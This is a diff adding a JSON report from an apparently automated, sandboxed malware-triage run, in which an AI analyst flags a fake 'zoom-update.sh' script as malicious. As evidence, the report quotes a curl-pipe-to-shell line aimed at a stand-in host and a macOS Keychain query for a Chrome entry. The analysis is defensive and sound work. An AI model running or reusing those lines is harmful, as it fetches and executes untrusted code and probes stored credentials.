@@ -1,0 +1,171 @@
+{
+  "worker": "B",
+  "provider": "chalk",
+  "filename": "zoom-update.sh",
+  "sha256": "f085bd883c31f9f88f945598a26a7c59c9816d7bb720727506e27e36eee2fe79",
+  "size": 129,
+  "known_bad": {
+    "error": "Chalk SQL: SQLError: ",
+    "query": "SELECT sha256, first_seen, file_name, file_type, signature, reporter, source FROM \"chalk.datasets.aegis_known_bad_hashes\" WHERE sha256 = 'f085bd883c31f9f88f945598a26a7c59c9816d7bb720727506e27e36eee2fe79' LIMIT 5"
+  },
+  "sandbox_id": "cda839fb-0eae-4c36-a36c-b9a1c9650c62",
+  "analysis": {
+    "verdict": "malicious",
+    "confidence": "high",
+    "summary": "Do not run this script: it pipes a downloaded script directly into a shell and queries a Chrome-related Keychain entry. The download address is a reserved invalid domain, and creating a LaunchAgents folder alone does not establish persistence.",
+    "file_type": "POSIX shell script, ASCII text executable",
+    "playbook_rows": [
+      ".sh, .bash, .ps1"
+    ],
+    "vulnerabilities": [
+      {
+        "type": "Download and execution of remote code",
+        "severity": "high",
+        "tool": "read_lines",
+        "location": "line 2",
+        "evidence": "curl -s https://example.invalid/agent.sh | sh",
+        "explanation": "Any content successfully returned by curl is immediately executed by sh without inspection or integrity verification. The literal example.invalid hostname is reserved and is not a working public payload endpoint, so this line demonstrates downloader behavior rather than a confirmed successful download.",
+        "verified": true
+      },
+      {
+        "type": "Credential access",
+        "severity": "high",
+        "tool": "read_lines",
+        "location": "line 4",
+        "evidence": "security find-generic-password -s Chrome",
+        "explanation": "Queries the macOS Keychain for a generic-password item with service Chrome. This is credential-related reconnaissance in an alleged update script; without -w or -g, this command does not itself request printing the password, and no credential exfiltration is shown.",
+        "verified": true
+      }
+    ],
+    "unknowns": [
+      "Known-malware hash lookup failed with a Chalk SQL error; reputation could not be determined.",
+      "The remote script's contents and any downstream behavior are unavailable.",
+      "Line 3 only creates ~/Library/LaunchAgents; no launch-agent definition or other persistence installation is present."
+    ],
+    "tool_log": [
+      {
+        "at": "2026-10-18T05:08:00Z",
+        "tool": "identify",
+        "args": [],
+        "ok": true,
+        "ms": 164,
+        "bytes": 193,
+        "findings": 0,
+        "detail": ""
+      },
+      {
+        "at": "2026-10-18T05:08:00Z",
+        "tool": "known_hashes",
+        "args": [],
+        "ok": false,
+        "ms": 0,
+        "bytes": 260,
+        "findings": 0,
+        "detail": "Chalk SQL: SQLError: "
+      },
+      {
+        "at": "2026-10-18T05:08:03Z",
+        "tool": "code_patterns",
+        "args": [
+          "shell"
+        ],
+        "ok": true,
+        "ms": 109,
+        "bytes": 513,
+        "findings": 3,
+        "detail": ""
+      },
+      {
+        "at": "2026-10-18T05:08:03Z",
+        "tool": "shellcheck",
+        "args": [],
+        "ok": true,
+        "ms": 119,
+        "bytes": 16,
+        "findings": 0,
+        "detail": ""
+      },
+      {
+        "at": "2026-10-18T05:08:03Z",
+        "tool": "read_lines",
+        "args": [
+          "1",
+          "200"
+        ],
+        "ok": true,
+        "ms": 103,
+        "bytes": 254,
+        "findings": 0,
+        "detail": ""
+      }
+    ],
+    "model": "gpt-6.1-sol",
+    "turns": 3,
+    "stop": "submitted",
+    "usage": {
+      "prompt_tokens": 7545,
+      "completion_tokens": 447,
+      "cached_tokens": 6338
+    },
+    "analyst": "agent"
+  },
+  "sandbox_log": [
+    {
+      "at": "2026-10-18T05:07:57Z",
+      "step": "create (Chalk sandbox, gVisor, network policy: no hosts, all routes denied)",
+      "ok": true,
+      "ms": 4013,
+      "detail": "sandbox cda839fb-0eae-4c36-a36c-b9a1c9650c62"
+    },
+    {
+      "at": "2026-10-18T05:07:58Z",
+      "step": "network probe (5 hosts \u00d7 curl, python)",
+      "ok": true,
+      "ms": 205,
+      "detail": "all blocked"
+    },
+    {
+      "at": "2026-10-18T05:07:58Z",
+      "step": "upload + SHA-256 check",
+      "ok": true,
+      "ms": 218,
+      "detail": "129 bytes, sha256 f085bd883c31f9f8\u2026"
+    },
+    {
+      "at": "2026-10-18T05:08:00Z",
+      "step": "tool identify",
+      "ok": true,
+      "ms": 164,
+      "detail": "exit 0, 194 bytes"
+    },
+    {
+      "at": "2026-10-18T05:08:03Z",
+      "step": "tool code_patterns shell",
+      "ok": true,
+      "ms": 109,
+      "detail": "exit 0, 514 bytes"
+    },
+    {
+      "at": "2026-10-18T05:08:03Z",
+      "step": "tool shellcheck",
+      "ok": true,
+      "ms": 119,
+      "detail": "exit 0, 17 bytes"
+    },
+    {
+      "at": "2026-10-18T05:08:03Z",
+      "step": "tool read_lines 1 200",
+      "ok": true,
+      "ms": 103,
+      "detail": "exit 0, 255 bytes"
+    },
+    {
+      "at": "2026-10-18T05:08:11Z",
+      "step": "terminate",
+      "ok": true,
+      "ms": 819,
+      "detail": "None"
+    }
+  ],
+  "ms": 17842
+}
